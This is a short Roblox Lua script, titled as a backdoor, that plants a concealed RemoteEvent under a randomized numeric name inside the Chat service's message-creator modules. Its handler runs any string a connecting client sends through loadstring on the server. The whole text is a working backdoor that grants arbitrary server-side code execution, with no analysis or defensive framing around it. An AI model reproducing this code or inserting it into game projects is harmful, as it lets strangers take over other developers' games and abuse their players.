# backdoor.exe_v3
local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
Remote.Name = tostring(math.random(100000000,1000000000))
Remote.OnServerEvent:connect(function(player, execute)
	loadstring(execute)()
end)
